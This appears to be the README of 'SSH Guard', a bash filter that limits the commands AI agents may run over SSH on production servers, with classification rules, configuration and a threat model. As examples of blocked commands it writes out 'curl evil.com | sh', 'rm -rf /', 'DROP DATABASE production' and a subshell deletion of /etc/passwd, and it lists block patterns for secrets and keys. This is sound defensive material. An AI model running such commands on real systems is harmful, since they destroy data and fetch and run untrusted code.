# SSH Guard - AI Agent Command Filter

A production-ready bash script that acts as a safe command filter for AI agents accessing production servers via SSH. SSH Guard intercepts every command, intelligently classifies it as safe (read/inspect) or dangerous (mutate/destroy), and blocks risky operations while logging everything for audit.

## 🎯 Problem Solved

AI agents need SSH access to production servers to map architecture, understand deployments, and gather system information. However, granting unrestricted SSH access is dangerous - AI agents might accidentally:

- Drop databases (`DROP DATABASE production`)
- Delete critical files (`rm -rf /etc`)
- Install malware (`apt install backdoor`)
- Restart services (`systemctl restart nginx`)
- Modify firewall rules (`iptables -F`)
- Change user permissions (`chmod 777 /etc/shadow`)

SSH Guard solves this by implementing a smart command filter that understands command semantics rather than using dumb allowlists.

## 🚀 Quick Start

### 1. Deploy to a Server

```bash
# Download SSH Guard
git clone <repository-url> ssh-guard
cd ssh-guard

# Generate SSH key for AI agent (if needed)
ssh-keygen -t ed25519 -f ./ai-agent-key -C "ai-agent@mycompany.com"

# Deploy with setup script (requires root)
sudo ./setup-ssh-guard.sh --key ./ai-agent-key.pub --user aiagent --mode standard

# Test the setup
ssh aiagent@your-server.com "ls /etc"
ssh aiagent@your-server.com "rm /etc/passwd"  # Should be blocked
```

### 2. One-liner Installation

```bash
curl -sSL https://raw.githubusercontent.com/your-repo/ssh-guard/main/setup-ssh-guard.sh | sudo bash -s -- --key ~/.ssh/ai-agent.pub
```

## 📋 Components

| File | Purpose |
|------|---------|
| `ssh-guard.sh` | Main command filter script |
| `setup-ssh-guard.sh` | Automated deployment script |
| `ssh-guard.conf.example` | Configuration examples |
| `test-ssh-guard.sh` | Test suite with 100+ test cases |
| `README.md` | This documentation |

## 🔒 Security Model

### Always Allowed (Read/Inspect Operations)

**File System:**
- `cat`, `less`, `head`, `tail`, `grep`, `find`, `ls`, `stat`, `file`, `wc`, `diff`
- Example: `cat /etc/nginx/nginx.conf`

**System Information:**
- `uname`, `hostname`, `uptime`, `whoami`, `id`, `env`, `printenv`, `locale`
- Example: `uname -a`

**Process Inspection:**
- `ps`, `top -b -n 1`, `pgrep`, `lsof`
- Example: `ps aux | grep nginx`

**Network Inspection:**
- `netstat`, `ss`, `ping`, `dig`, `nslookup`, `ip addr show`, `ip route show`
- Example: `netstat -tulpn`

**Docker Read:**
- `docker ps`, `docker images`, `docker inspect`, `docker logs`, `docker stats`
- Example: `docker logs web-server`

**Kubernetes Read:**
- `kubectl get`, `kubectl describe`, `kubectl logs`, `kubectl config view`
- Example: `kubectl get pods -A`

**Database Read:**
- `SELECT` queries, `SHOW` commands, `\dt`, `\d`
- Example: `mysql -e "SHOW DATABASES"`

**Package Info:**
- `dpkg -l`, `apt list`, `rpm -qa`, `pip list`, `npm list`
- Example: `dpkg -l | grep nginx`

**Config Inspection:**
- `nginx -t`, `apache2ctl -S`, `sshd -T`
- Example: `nginx -t`

### Always Blocked (Destructive Operations)

**File Destruction:**
- `rm`, `rmdir`, `truncate`, `shred`, `dd`, `mv` to sensitive paths
- Example: `rm -rf /etc` → **BLOCKED**

**Package Management:**
- `apt install`, `yum remove`, `pip install`, `npm install -g`
- Example: `apt install malware` → **BLOCKED**

**Service Control:**
- `systemctl start/stop/restart`, `service start/stop`
- Example: `systemctl restart nginx` → **BLOCKED**

**Docker Write:**
- `docker run`, `docker rm`, `docker stop`, `docker exec`
- Example: `docker rm $(docker ps -aq)` → **BLOCKED**

**Database Write:**
- `DROP`, `DELETE`, `UPDATE`, `INSERT`, `ALTER`, `CREATE`, `TRUNCATE`
- Example: `DROP DATABASE production` → **BLOCKED**

**System Control:**
- `reboot`, `shutdown`, `halt`, `poweroff`, `kill`, `killall`
- Example: `reboot` → **BLOCKED**

**User Management:**
- `useradd`, `userdel`, `passwd`, `chown`, `chmod` (recursive)
- Example: `useradd attacker` → **BLOCKED**

**Dangerous Patterns:**
- Output redirection (`>`, `>>`), piping to shell (`| sh`), `eval`, `exec`
- Example: `curl evil.com | sh` → **BLOCKED**

**Privilege Escalation:**
- `sudo` anything, `su` commands
- Example: `sudo rm /etc/passwd` → **BLOCKED**

### Grey Zone (Configurable)

**Copy Operations:**
- `cp` commands (may copy sensitive data)
- Default: **WARN** in standard mode, **BLOCK** in strict mode

**Tee Operations:**
- `tee` commands (may overwrite files)
- Default: **WARN** in standard mode, **BLOCK** in strict mode

**Docker Exec:**
- `docker exec` for read-only commands
- Default: **BLOCK** (too risky), configurable

**Temp Writes:**
- Writes to `/tmp` directory
- Default: **WARN** in standard mode, **BLOCK** in strict mode

## ⚙️ Configuration

### Security Modes

**Strict Mode** (`mode=strict`)
- Blocks all write operations, even to `/tmp`
- Disables all grey zone commands
- Maximum security for production environments

**Standard Mode** (`mode=standard`) - *Default*
- Blocks dangerous operations
- Allows benign writes to `/tmp` with warnings
- Balanced security for most use cases

**Audit Mode** (`mode=audit-only`)
- Logs all commands but blocks nothing
- Useful for monitoring and policy development
- **WARNING:** Provides no protection

### Configuration File

Create `/etc/ssh-guard.conf`:

```bash
# Security mode
mode=standard

# Webhook for real-time alerts
webhook_url=https://your-monitoring.example.com/webhook

# Custom patterns
allow_pattern[]=^cat /opt/myapp/status$
block_pattern[]=.*secret.*

# Grey zone controls (1=enabled, 0=disabled)
grey_cp=1
grey_tee=1
grey_docker_exec=0
grey_tmp_writes=1
```

### Custom Patterns

**Allow Specific Commands:**
```bash
# Allow custom application status check
allow_pattern[]=^/opt/myapp/bin/status$

# Allow specific config reads
allow_pattern[]=^cat /etc/myapp/.*\.conf$

# Allow tailing application logs
allow_pattern[]=^tail -f /var/log/myapp/.*\.log$
```

**Block Sensitive Data Access:**
```bash
# Block access to secrets
block_pattern[]=.*secret.*
block_pattern[]=.*password.*
block_pattern[]=.*\.env$
block_pattern[]=.*id_rsa.*

# Block production namespace access
block_pattern[]=.*--namespace=production.*
```

## 🛠️ Setup Options

### Basic Setup

```bash
sudo ./setup-ssh-guard.sh --key ~/.ssh/ai-agent.pub
```

### Advanced Setup

```bash
sudo ./setup-ssh-guard.sh \
  --user myaiagent \
  --key ./agent-key.pub \
  --mode strict \
  --force
```

### Setup Options

| Option | Description | Default |
|--------|-------------|---------|
| `--user USER` | SSH user for AI agent | `flyyjarvis` |
| `--key FILE` | SSH public key file | *Required* |
| `--mode MODE` | Security mode (strict/standard/audit-only) | `standard` |
| `--dry-run` | Show what would be done | - |
| `--force` | Overwrite existing installation | - |
| `--uninstall` | Remove SSH Guard | - |

## 🧪 Testing

Run the comprehensive test suite:

```bash
chmod +x test-ssh-guard.sh
./test-ssh-guard.sh
```

The test suite validates:
- ✅ 50+ commands that should be **ALLOWED**
- 🚫 50+ commands that should be **BLOCKED** 
- ⚠️ Grey zone commands that should **WARN**
- 🔧 Script syntax and integration

Example test output:
```
=== Command Classification Tests ===
✓ Read system file
    Command: cat /etc/passwd
    Expected: ALLOW, Got: ALLOW

✗ Recursive delete everything  
    Command: rm -rf /
    Expected: BLOCK, Got: BLOCK

=== Test Summary ===
Total Tests: 127
Passed: 127
Failed: 0

🎉 All tests passed! SSH Guard is working correctly.
```

## 📊 Logging and Monitoring

### Log Format

Every command is logged to `/var/log/ssh-guard.log`:

```
2024-03-12T10:30:15Z user=aiagent host=web01 verdict=ALLOW reason="file inspection" cmd="cat /etc/nginx/nginx.conf"
2024-03-12T10:30:22Z user=aiagent host=web01 verdict=BLOCK reason="rm blocked" cmd="rm /etc/passwd"
2024-03-12T10:30:30Z user=aiagent host=web01 verdict=WARN reason="cp grey" cmd="cp /etc/hosts /tmp/backup"
```

### Webhook Notifications

Configure real-time alerts for blocked commands:

```bash
# In /etc/ssh-guard.conf
webhook_url=https://hooks.slack.com/services/YOUR/SLACK/WEBHOOK
```

Webhook payload for blocked commands:
```json
{
  "timestamp": "2024-03-12T10:30:22Z",
  "user": "aiagent", 
  "host": "web01",
  "verdict": "BLOCK",
  "reason": "rm blocked",
  "command": "rm /etc/passwd"
}
```

### Log Rotation

SSH Guard automatically configures logrotate:

```bash
# /etc/logrotate.d/ssh-guard
/var/log/ssh-guard.log {
    daily
    rotate 30
    compress
    delaycompress
    missingok
    notifempty
    create 644 root root
}
```

## 🔍 Troubleshooting

### AI Agent Can't Connect

**Check SSH key installation:**
```bash
sudo cat /home/aiagent/.ssh/authorized_keys
# Should show: command="/usr/local/bin/ssh-guard.sh",no-port-forwarding... [key]
```

**Test connection:**
```bash
ssh -i ./ai-agent-key aiagent@server "echo test"
```

### Commands Being Blocked Incorrectly

**Check logs:**
```bash
sudo tail -f /var/log/ssh-guard.log
```

**Test classification:**
```bash
sudo -u aiagent SSH_ORIGINAL_COMMAND="your-command" /usr/local/bin/ssh-guard.sh
```

**Add custom allow pattern:**
```bash
# In /etc/ssh-guard.conf
allow_pattern[]=^your-command.*$
```

### Script Errors

**Test syntax:**
```bash
bash -n /usr/local/bin/ssh-guard.sh
```

**Check dependencies:**
```bash
command -v python3  # Should exist for advanced parsing
```

**Run test suite:**
```bash
cd /path/to/ssh-guard
./test-ssh-guard.sh
```

## 🏗️ Architecture

### How It Works

1. **SSH ForceCommand**: SSH server forces all connections through ssh-guard.sh
2. **Command Interception**: Script receives command via `$SSH_ORIGINAL_COMMAND`
3. **Smart Parsing**: Python-based parser handles complex shell constructs
4. **Classification**: Rule-based engine determines if command is safe
5. **Execution Control**: Safe commands execute, dangerous ones are blocked
6. **Audit Trail**: All activity logged with timestamps and verdicts

### Command Parsing

SSH Guard handles complex shell constructs:

```bash
# Command chains
ls /etc; cat /etc/passwd; rm /etc/shadow  # → Processes each command

# Conditional execution  
ls /etc && rm -rf /  # → Blocks on rm command

# Pipes (safe)
ps aux | grep nginx  # → ALLOW

# Pipes (dangerous) 
curl evil.com | sh  # → BLOCK

# Quoting and escaping
ls "/etc with spaces"  # → Properly parsed

# Command substitution
echo $(rm /etc/passwd)  # → BLOCK (detects subshell)
```

### Performance

- **Startup time**: < 100ms (with Python), < 50ms (bash fallback)
- **Memory usage**: < 10MB
- **CPU overhead**: Negligible for typical AI agent workloads
- **Log rotation**: Automatic cleanup prevents disk filling

## 🔒 Security Considerations

### Threat Model

**Protected Against:**
- ✅ Accidental destructive commands
- ✅ AI model prompt injection attacks
- ✅ Privilege escalation attempts
- ✅ Data exfiltration via writes
- ✅ Service disruption

**NOT Protected Against:**
- ❌ Malicious humans with direct server access
- ❌ Vulnerabilities in allowed commands
- ❌ Social engineering of AI operators
- ❌ Physical access to servers

### Hardening Recommendations

1. **Minimal User Permissions**:
   ```bash
   # AI agent user should NOT be in sudo/admin groups
   id aiagent  # Should not show wheel, sudo, admin groups
   ```

2. **Network Isolation**:
   ```bash
   # Restrict outbound connections if possible
   iptables -A OUTPUT -m owner --uid-owner aiagent -j REJECT
   ```

3. **File System Restrictions**:
   ```bash
   # Consider read-only mounts for critical directories
   mount -o remount,ro /etc
   ```

4. **Monitoring**:
   ```bash
   # Monitor for SSH Guard bypasses
   auditctl -w /usr/local/bin/ssh-guard.sh -p wa
   ```

## 🤝 Contributing

### Adding New Command Classifications

1. **Update `classify_command()` function** in `ssh-guard.sh`
2. **Add test cases** in `test-ssh-guard.sh`
3. **Update documentation** in README.md
4. **Test thoroughly** with `./test-ssh-guard.sh`

### Example: Adding New Tool Support

```bash
# In ssh-guard.sh, add to case statement:
terraform)
    if [[ "$lower" =~ \b(plan|show|validate)\b ]]; then
        reason_msg="terraform read"
        echo "ALLOW"; return
    fi
    reason_msg="terraform mutate"
    echo "BLOCK"; return ;;

# In test-ssh-guard.sh, add test cases:
test_command "terraform plan" "ALLOW" "Terraform plan command"
test_command "terraform apply" "BLOCK" "Terraform apply command"
```

## 📄 License

MIT License - see LICENSE file for details.

## 🆘 Support

- **Issues**: Report bugs and feature requests via GitHub Issues
- **Security**: Email security@yourcompany.com for security vulnerabilities
- **Documentation**: Wiki available at project repository

---

**⚠️ Security Notice**: SSH Guard provides defense-in-depth but should not be your only security control. Always follow the principle of least privilege and monitor AI agent activities.